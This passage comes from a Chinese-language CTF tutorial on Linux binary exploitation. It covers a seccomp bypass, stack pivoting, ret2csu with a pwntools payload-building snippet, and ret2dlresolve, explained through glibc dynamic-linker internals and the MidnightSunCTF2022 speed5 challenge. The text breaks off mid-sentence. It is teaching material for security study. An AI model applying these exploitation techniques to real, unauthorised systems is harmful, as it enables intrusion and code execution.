<code>read</code> 的 fd 必须为 0 ，即只能从标准输入读入。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x25 0x00 0x01 0x00000110  if (A &lt;= 0x110) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0015</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0017</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure></div>
绕过方法是在 orw 之前先用 rop 调用 <code>close</code>
关闭标准输入，这样再 <code>open</code> 返回的 <code>fd</code> 就是 0
了。 # 栈迁移 栈迁移主要是为了解决栈溢出溢出空间大小不足的问题。</p>
<p>通过栈溢出将将栈中的ebp覆盖为fake_ebp-4（64位为fake_ebp-8，因为leave指令mov
esp,ebp之后还有pop
ebp使得esp增加），通过两次leave可以将esp的值改为fake_ebp，从而完成栈迁移，这样就可以在溢出空间不足的情况下构造完整的rop链。</p>
<h2 id="栈迁移到数据填充段">栈迁移到数据填充段</h2>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/41c4d94f80c46b5ce1ddd2376a57f3d1.png"
                      
                ></p>
<p>将栈迁移到数据填充段中，执行其中的rop。</p>
<h2 id="栈迁移到其它空闲地址">栈迁移到其它空闲地址</h2>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/db12ad52b7a1912665ab0bc5ed002e66.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<p>调用<code>read</code>函数将rop写入空闲地址中，然后将栈迁移到该地址执行该rop。</p>
<p>这里返回到<code>read</code>函数时会有<code>push ebp</code>保存ebp值，<code>read</code>函数中的<code>leave;ret</code>语句不会对栈迁移造成影响，因此还要再加一个<code>leave;ret</code>。</p>
<h1 id="ret2csu">ret2csu</h1>
<p>在 64 位程序中，函数的前 6
个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的
gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的
gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用
libc 函数，所以这个函数一定会存在。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure></div>
<p>可以看到，如果能够控制 <code>r12</code> 和 <code>r8</code>
寄存器的值就可以利用 <code>0x0000000000400609</code> 地址处的
<code>call</code> 指令执行任意函数。因此可以利用
<code>0x0000000000400616</code> 到 <code>0000000000400624</code>
的汇编指令先控制寄存器的值，然后再执行 <code>0x0000000000400600</code>
到 <code>0x0000000000400624</code>
的汇编指令调用目标函数，然后返回到主函数再次利用。</p>
<p>对应脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
<p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure></div>
<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC
本身只是将程序的执行地址处的数据传递给 CPU，而 CPU
则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
<h1 id="ret2dlresolve">ret2dlresolve</h1>
<p>需要用 ret2dlresolve 的题目的最大特征是不提供 libc 。另外如果使用
ret2dlresolve 则不能使用 patchelf 修改 elf
文件，因为这样会移动延迟绑定相关的结构。 ## 相关结构</p>
<p>主要有 <code>.dynamic</code> 、<code>.dynstr</code>
、<code>.dynsym</code> 和 <code>.rel.plt</code> 四个重要的 section
。</p>
<p>结构及关系如下如图（以 32 位为例）： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d05fcb3f3322bf190a51a7088d9b1ad1.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="dyn">Dyn</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>
<p>Dyn 结构体用于描述动态链接时需要使用到的信息，其成员含义如下： -
<code>d_tag</code>
表示标记值，指明了该结构体的具体类型。比如，<code>DT_NEEDED</code>
表示需要链接的库名，<code>DT_PLTRELSZ</code> 表示 PLT 重定位表的大小等。
- <code>d_un</code> 是一个联合体，用于存储不同类型的信息。具体含义取决于
<code>d_tag</code> 的值。 - 如果 <code>d_tag</code>
的值是一个整数类型，则用 <code>d_val</code> 存储它的值。 - 如果
<code>d_tag</code> 的值是一个指针类型，则用 <code>d_ptr</code>
存储它的值。 ### Sym <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div> Sym 结构体用于描述 ELF
文件中的符号（Symbol）信息，其成员含义如下： -
<code>st_name</code>：指向一个存储符号名称的字符串表的索引，即<strong>字符串相对于字符串表起始地址的偏移</strong>。
- <code>st_info</code>：如果 <strong><code>st_other</code> 为 0</strong>
则设置成 0x12 即可。 -
<code>st_other</code>：决定<strong>函数参数</strong>
<code>link_map</code> 参数是否有效。如果该值不为 0 则直接通过
<code>link_map</code> 中的信息计算出目标函数地址。否则需要调用
<code>_dl_lookup_symbol_x</code> 函数查询出新的 <code>link_map</code> 和
<code>sym</code> 来计算目标函数地址。 -
<code>st_value</code>：符号地址相对于模块基址的偏移值。 ### Rel
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure></div> Rel
结构体用于描述重定位（Relocation）信息，其成员含义如下： -
<code>r_offset</code>：加上<strong>传入的参数</strong>
<code>link_map-&gt;l_addr</code> 等于该函数对应 got 表地址。 -
<code>r_info</code> ：符号索引的低 8 位（32 位 ELF）或低 32 位（64 位
ELF）指示符号的类型这里设为 7 即可，高 24 位（32 位 ELF）或高 32 位（64
位 ELF）指示符号的索引即 <code>Sym</code> 构造的数组中的索引。 ###
link_map <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    ...</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br></pre></td></tr></table></figure></div> <code>link_map</code>
是存储目标函数查询结果的一个结构体，我们主要关心 <code>l_addr</code> 和
<code>l_info</code> 两个成员即可。 - <code>l_addr</code>：目标函数所在
lib 的基址。 - <code>l_info</code>：<code>Dyn</code>
结构体指针，指向各种结构对应的 <code>Dyn</code> 。 -
<code>l_info[DT_STRTAB]</code>：即 <code>l_info</code> 数组第 5 项，指向
<code>.dynstr</code> 对应的 <code>Dyn</code> 。 -
<code>l_info[DT_SYMTAB]</code>：即 <code>l_info</code> 数组第 6 项，指向
<code>Sym</code> 对应的 <code>Dyn</code> 。 -
<code>l_info[DT_JMPREL]</code>：即 <code>l_info</code> 数组第 23
项，指向 <code>Rel</code> 对应的 <code>Dyn</code> 。 ##
_dl_runtime_resolve 函数</p>
<p><code>_dl_runtime_resolve</code> 函数的作用可以见前面 ret2libc 中
linux 延迟绑定机制的原理介绍图。这里详细介绍的是该函数的具体实现。</p>
<p>其中 <code>_dl_runtime_resolve</code> 的核心函数位
<code>_dl_fixup</code> 函数，这里是为了避免 <code>_dl_fixup</code>
传参与目标函数传参干扰（<code>_dl_runtime_resolve</code>
函数通过栈传参然后转换成 <code>_dl_fixup</code>
的寄存器传参）以及调用目标函数才在 <code>_dl_fixup</code> 外面封装一个
<code>_dl_runtime_resolve</code> 函数。<code>_dl_fixup</code>
函数的定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map ，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 需要注意的是 <code>_dl_fixup</code>
中会有如下判断，根据这个判断决定了重定位的策略。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div></p>
<p><code>_dl_fixup</code> 函数在计算出目标函数地址并更新 got
表之后会回到 <code>_dl_runtime_resolve</code> 函数，之后
<code>_dl_runtime_resolve</code> 函数会<strong>调用目标函数</strong>。
## 32 位 ret2dlresolve 在 32 位下我们可以利用
<code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0
时的执行流程进行控制流劫持，因为这个执行流程会自动计算目标函数的地址，<strong>不需要知道
libc 具体版本</strong>，适用性更强。</p>
<p>其中 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时
<code>_dl_runtime_resolve</code> 函数的具体执行流程为： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/52d2f9340bd5f998d2887f40be788f3e.png%20=70%x"
                     
alt="在这里插入图片描述" 
                > - 用 <code>link_map</code> 访问
<code>.dynamic</code> ，取出 <code>.dynstr</code> ，
<code>.dynsym</code> ， <code>.rel.plt</code> 的指针。 -
<code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项
<code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。 -
<code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code>
的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作
<code>sym</code> 。 - <code>.dynstr + sym-&gt;st_name</code>
得出符号名字符串指针。 -
在动态链接库查找这个函数的地址，并且把地址赋值给
<code>*rel-&gt;r_offset</code> ，即 GOT 表。 - 调用这个函数。 ### 改写
.dynamic 的 DT_STRTAB 这个只有在 checksec 时 <code>NO RELRO</code>
可行，即 <code>.dynamic</code> 可写。因为 <code>ret2dl-resolve</code>
会从 <code>.dynamic</code> 里面拿 <code>.dynstr</code>
字符串表的指针，然后加上 offset
取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当
resolve 的时候，就能 resolve 成我们所指定的任意库函数。 ###
操纵第二个参数，使其指向我们所构造的 Elf32_Rel 由于
<code>_dl_runtime_resolve</code>
函数各种按下标取值的操作都没有进行越界检查，因此如果
<code>.dynamic</code> 不可写就操纵 <code>_dl_runtime_resolve</code>
函数的第二个参数，使其访问到可控的内存，然后在该内存中伪造
<code>.rel.plt</code> ，进一步可以伪造 <code>.dynsym</code> 和
<code>.dynstr</code> ，最终调用目标函数。</p>
<p>这里以 MidnightSunCTF2022 的 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed5" >speed5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
为例讲解具体利用过程：</p>
<p>可以看出，程序主体部分是一个非常简单的栈溢出。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">go</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于溢出长度有限，因此首先需要栈迁移到其他地址处。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/d9b4d1426691a6b5f2d36eab1f459760.png%20=60%x"
                     
alt="在这里插入图片描述" 
                ></p>
<p>为了调用 <code>_dl_runtime_resolve</code> 函数，可以把接下来 rop
中的返回地址设为该函数的 plt 表地址。该地址对应的汇编指令如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e67b342e7833f0cba6904e7f65910901.png"
                     
alt="在这里插入图片描述" 
                > 可以看出
<code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的参数1
<code>link_map_obj</code> 被 push 到栈中，在此之前，栈顶一定是参数2
<code>reloc_arg</code> 。因此构造的 rop
中接下来的值是伪造的参数2。接下来rop链的内容是目标函数的返回地址和参数（具体rop链为什么这么构造可以看前面
ret2libc 中 linux 延迟绑定机制的原理介绍图）。</p>
<p>之后就是伪造那 3 个结构，具体见下图。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6dafe13803caaf398e55613189c6bda3.png"
                     
alt="在这里插入图片描述" 
                > <strong>注意：如果 patchelf 修改了 ELF
